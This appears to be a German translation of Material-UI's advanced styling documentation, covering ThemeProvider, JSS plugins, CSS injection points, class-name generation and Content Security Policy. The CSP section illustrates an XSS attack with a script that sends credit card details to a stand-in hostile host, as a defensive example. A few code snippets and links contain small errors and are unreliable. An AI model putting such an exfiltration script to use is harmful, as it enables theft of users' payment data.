# Erweitert

<p class="description">Fortgeschrittene Verwendung.</p>

## Theming

Fügen Sie auf der oberste Ebene Ihrer App einen ` ThemeProvider` hinzu, um auf das Theme im Komponentenbaum von React zuzugreifen. Anschließend können Sie in den Stilfunktionen auf das Designobjekt zugreifen.

```jsx
import { ThemeProvider } from '@material-ui/styles';

const theme = {
  background: 'linear-gradient(45deg, #FE6B8B 30%, #FF8E53 90%)',
};

function Theming() {
  return (
    <ThemeProvider theme={theme}>
      <DeepChild />
    </ThemeProvider>
  );
}
```

{{"demo": "pages/css-in-js/advanced/Theming.js"}}

## Zugriff auf das Theme in einer Komponente

Möglicherweise müssen Sie auf die Themevariablen in Ihren React-Komponenten zugreifen.

### `useTheme` hook

```jsx
import { useTheme } from '@material-ui/styles';

function DeepChild() {
  const theme = useTheme();
  return <span>{`spacing ${theme.spacing}`}</span>;
}
```

{{"demo": "pages/css-in-js/advanced/UseTheme.js"}}

### `withTheme` HOC

```jsx
import { withTheme } from '@material-ui/styles';

function DeepChildRaw(props) {
  return <span>{`spacing ${props.theme.spacing}`}</span>;
}

const DeepChild = withTheme(DeepChildRaw);
```

{{"demo": "pages/css-in-js/advanced/WithTheme.js"}}

## Verschachtelung des Themes

Sie können mehrere Theme Provider verschachteln. Dies kann sehr nützlich sein, wenn Sie sich mit unterschiedlichen Bereichen Ihrer Anwendung befassen, die sich voneinander unterscheiden.

```jsx
<ThemeProvider theme={outerTheme}>
  <Child1 />
  <ThemeProvider theme={innerTheme}>
    <Child2 />
  </ThemeProvider>
</ThemeProvider>
```

{{"demo": "pages/css-in-js/advanced/ThemeNesting.js"}}

Das innere Theme ** überschreibt** das äußere Theme. Sie können das äußere Theme erweitern, indem Sie eine Funktion bereitstellen:

```jsx
<ThemeProvider theme={…} >
  <Child1 />
  <ThemeProvider theme={outerTheme => ({ darkMode: true, ...outerTheme })}>
    <Child2 />
  </ThemeProvider>
</ThemeProvider>
```

## JSS-Plugins

JSS nutzt das Konzept von Plugins, um seine Kernfunktionalitäten zu erweitern, sodass die Benutzer die gewünschten Funktionen auswählen können. Sie zahlen den Leistungsaufwand nur für das, was Sie verwenden. Alle Plugins sind standardmäßig nicht verfügbar. Wir haben die folgende Liste hinzugefügt:

- [jss-plugin-rule-value-function](https://cssinjs.org/jss-plugin-rule-value-function/)
- [jss-plugin-global](https://cssinjs.org/jss-plugin-global/)
- [jss-plugin-nested](https://cssinjs.org/jss-plugin-nested/)
- [jss-plugin-camel-case](https://cssinjs.org/jss-plugin-camel-case/)
- [jss-plugin-default-unit](https://cssinjs.org/jss-plugin-default-unit/)
- [jss-plugin-vendor-prefixer](https://cssinjs.org/jss-plugin-default-unit/)
- [jss-plugin-props-sort](https://cssinjs.org/jss-plugin-vendor-prefixer/)

Es ist eine Teilmenge von [ Jss-Preset-Default ](https://cssinjs.org/jss-preset-default/). Selbstverständlich können Sie ein neues Plugin hinzufügen. Hier ist ein Beispiel mit dem [ jss-rtl ](https://github.com/alitaheri/jss-rtl) Plugin.

```jsx
import { create } from 'jss';
import { StylesProvider, jssPreset } from '@material-ui/styles';
import rtl from 'jss-rtl'

const jss = create({
  plugins: [...jssPreset().plugins, rtl()],
});

function App() {
  return (
    <StylesProvider jss={jss}>
      ...
    </StylesProvider>
  );
}

export default App;
```

## String-Vorlagen

Wenn Sie die CSS-Syntax bevorzugen, können Sie das [Jss-Plugin-Vorlage ](https://cssinjs.org/jss-plugin-template) Plugin verwenden.

```jsx
const useStyles = makeStyles({
  root: `
    background: linear-gradient(45deg, #fe6b8b 30%, #ff8e53 90%);
    border-radius: 3;
    border: 0;
    color: white;
    height: 48px;
    padding: 0 30px;
    box-shadow: 0 3px 5px 2px rgba(255, 105, 135, 0.3);
  `,
});
```

{{"demo": "pages/css-in-js/advanced/StringTemplates.js"}}

## CSS-Injektionsreihenfolge

Standardmäßig werden die Stile **zuletzt** in das `<head>` -Element Ihrer Seite eingefügt. Sie erhalten mehr Details als jedes andere Stylesheet auf Ihrer Seite, z.B. CSS-Module oder StilKomponenten.

### injectFirst

Die ` StylesProvider ` Komponente hat eine `injectFirst` Eigenschaft, um die Styles **zuerst** zu injizieren:

```js
import { StylesProvider } from '@material-ui/styles';

<StylesProvider injectFirst>
  {/* Dein Komponentenbaum.
      Mit Stil versehene Komponenten können die Stile von Material-UI überschreiben. */}
</StylesProvider>
```

### insertionPoint

JSS [bietet einen Mechanismus](https://github.com/cssinjs/jss/blob/master/docs/setup.md#specify-the-dom-insertion-point) um mehr Kontrolle über diese Situation zu erlangen. Durch Anpassen der Platzierung des `Einfügepunkts` innerhalb Ihres HTML-Heads können Sie die [Reihenfolge steuern ](https://cssinjs.org/jss-api#attach-style-sheets-in-a-specific-order) sodass die CSS-Regeln auf Ihre Komponenten angewendet werden.

#### HTML-Kommentar

Am einfachsten ist es, einen HTML-Kommentar hinzuzufügen, der bestimmt, wo JSS die Stile einfügt:

```jsx
<head>
  <!-- jss-insertion-point -->
  <link href="..." />
</head>
```

```jsx
import { create } from 'jss';
import { StylesProvider, jssPreset } from '@material-ui/styles';

const jss = create({
  ...jssPreset(),
  // Wir definieren einen individuellen insertion point, welcher von JSS benutzt wird, um die Stile in den DOM einzufügen.
  insertionPoint: 'jss-insertion-point',
});

function App() {
  return <StylesProvider jss={jss}>...</StylesProvider>;
}

export default App;
```

#### Andere HTML-Elemente

[Create React App](https://github.com/facebook/create-react-app) entfernt HTML-Kommentare beim Erstellen des Produktions-Builds. Um das Problem zu umgehen, können Sie ein DOM-Element (mit Ausnahme eines Kommentars) als JSS-Einfügepunkt angeben.

Zum Beispiel ein `<noscript>` Element:

```jsx
<head>
  <noscript id="jss-insertion-point" />
  <link href="..." />
</head>
```

```jsx
import { create } from 'jss';
import { StylesProvider, jssPreset } from '@material-ui/styles';

const jss = create({
  ...jssPreset(),
  // Wir definieren einen individuellen insertion point, welcher von JSS benutzt wird, um die Stile in den DOM einzufügen.
  insertionPoint: document.getElementById('jss-insertion-point'),
});

function App() {
  return <StylesProvider jss={jss}>...</StylesProvider>;
}

export default App;
```

#### JS createComment

codesandbox.io verhindert den Zugriff auf das `<head>` Element. Um das Problem zu umgehen, können Sie die JavaScript `Document.createComment()` API verwenden:

```jsx
import { create } from 'jss';
import { StylesProvider, jssPreset } from '@material-ui/styles';

const styleNode = document.createComment('jss-insertion-point');
document.head.insertBefore(styleNode, document.head.firstChild);

const jss = create({
  ...jssPreset(),
  // Wir definieren einen individuellen insertion point, welcher von JSS benutzt wird, um die Stile in den DOM einzufügen.
  insertionPoint: 'jss-insertion-point',
});

function App() {
  return <StylesProvider jss={jss}>...</StylesProvider>;
}

export default App;
```

## Server-Rendering

## Klassennamen

Möglicherweise haben Sie festgestellt, dass die Klassennamen, die von unserer Styling-Lösung generiert werden, **nicht deterministisch sind**. Sie können sich also nicht darauf verlassen, dass sie gleich bleiben. Die Klassennamen werden von [unserem Klassennamengenerator generiert](/css-in-js/api/#creategenerateclassname-options-class-name-generator). Nehmen wir den folgenden Stil als Beispiel:

```jsx
const useStyles = makeStyles({
  root: {
    opacity: 1,
  },
}, {
  name: 'AppBar',
});
```

Es wird ein `AppBar-root-5pbwdt` Klassenname generiert. Das folgende CSS wird nicht funktionieren:

```css
.AppBar-root-5pbwdt {
  opacity: 0.6;
}
```

Sie müssen die `Klassen` Eigenschaft einer Komponente verwenden, um sie zu überschreiben. Dank der nicht-deterministische Natur der Klassennamen, können wir Optimierungen für Entwicklung und Produktion implementieren. Sie sind in der Entwicklung einfach zu debuggen und in der Produktion so kurz wie möglich:

- In der **Entwicklung** lauten der Klassenname: `.AppBar-root-5pbwdt` nach dieser Logik:

```js
const sheetName = 'AppBar';
const ruleName = 'root';
const identifier = 5pbwdt;

const className = `${sheetName}-${ruleName}-${identifier}`;
```

- In der **Produktion** lauten der Klassenname: `.jss5pbwdt` nach dieser Logik:

```js
const productionPrefix = 'jss';
const identifier = 5pbwdt;

const className = `${productionPrefix}-${identifier}`;
```

Wenn Sie dieses Standardverhalten nicht mögen, können Sie es ändern. JSS basiert auf dem Konzept eines [Generators für Klassennamen](https://cssinjs.org/jss-api/#generate-your-class-names).

## Globales CSS

### `jss-plugin-global`

Das [`jss-plugin-global`](#jss-plugins) Plugin ist in der Standardvoreinstellung installiert. Sie können damit globale Klassennamen definieren.

{{"demo": "pages/css-in-js/advanced/GlobalCss.js"}}

### Hybrid

Sie können auch JSS-generierte Klassennamen mit globalen Namen kombinieren.

{{"demo": "pages/css-in-js/advanced/HybridGlobalCss.js"}}

### Deterministische Klassennamen

Wir bieten eine Option, um die Klassennamen **deterministisch zu machen** mit der [`dangerouslyUseGlobalCS`](/css-in-js/api/#creategenerateclassname-options-class-name-generator) Option. Wenn diese Option aktiviert ist, sehen die Klassennamen folgendermaßen aus:

- entwicklung: `.AppBar-root`
- produktion: `.AppBar-root`

⚠️ **Seien Sie vorsichtig, wenn Sie `dangerouslyUseGlobalCSS `** verwenden. Das Verlassen auf diesen Code, der in der Produktion ausgeführt wird, hat folgende Auswirkungen:

- Es ist schwieriger, die `Klassen` API-Änderungen zwischen Hauptversionen zu verfolgen.
- Globales CSS ist von Natur aus fragil.

⚠️ Bei gefährlicher Verwendung von `dangerouslyUseGlobalCSS` als Standalone (ohne Material-UI) sollten Sie Ihre Stylesheets mit dem `options` Parameter versehen:

```jsx
// Hook
const useStyles = makeStyles(styles, { name: 'button' });

// Styled-components
const Button = styled(styles, { name: 'button' })(ButtonBase);

// Higher-order component
const Button = withStyles(styles, { name: 'button' })(ButtonBase);
```

## CSS-Präfix

JSS verwendet Featureerkennung, um die korrekten Präfixe anzuwenden. [Don't be surprised](https://github.com/mui-org/material-ui/issues/9293) if you can't see a specific prefix in the latest version of Chrome. Your browser probably doesn't need it.

## Content Security Policy (CSP)

### What is CSP and why is it useful?

Basically, CSP mitigates cross-site scripting (XSS) attacks by requiring developers to whitelist the sources their assets are retrieved from. This list is returned as a header from the server. For instance, say you have a site hosted at `https://example.com` the CSP header `default-src: 'self';` will allow all assets that are located at `https://example.com/*` and deny all others. If there is a section of your website that is vulnerable to XSS where unescaped user input is displayed, an attacker could input something like:

    <script>
      sendCreditCardDetails('https://hostile.example');
    </script>
    

This vulnerability would allow the attacker to execute anything. However, with a secure CSP header, the browser will not load this script.

You can read more about CSP on the [MDN Web Docs](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP).

### How does one implement CSP?

In order to use CSP with Material-UI (and JSS), you need to use a nonce. A nonce is a randomly generated string that is only used once, therefore you need to add a server middleware to generate one on each request. JSS has a [great tutorial](https://github.com/cssinjs/jss/blob/next/docs/csp.md) on how to achieve this with Express and React Helmet. For a basic rundown, continue reading.

A CSP nonce is a Base 64 encoded string. You can generate one like this:

```js
import uuidv4 from 'uuid/v4';

const nonce = new Buffer(uuidv4()).toString('base64');
```

It is very important you use UUID version 4, as it generates an **unpredictable** string. You then apply this nonce to the CSP header. A CSP header might look like this with the nonce applied:

```js
header('Content-Security-Policy')
  .set(`default-src 'self'; style-src: 'self' 'nonce-${nonce}';`);
```

If you are using Server Side Rendering (SSR), you should pass the nonce in the `<style>` tag on the server.

```jsx
<style
  id="jss-server-side"
  nonce={nonce}
  dangerouslySetInnerHTML={{ __html: sheetsRegistry.toString() } }
/>
```

Then, you must pass this nonce to JSS so it can add it to subsequent `<style>` tags. The client side gets the nonce from a header. You must include this header regardless of whether or not SSR is used.

```jsx
<meta property="csp-nonce" content={nonce} />
```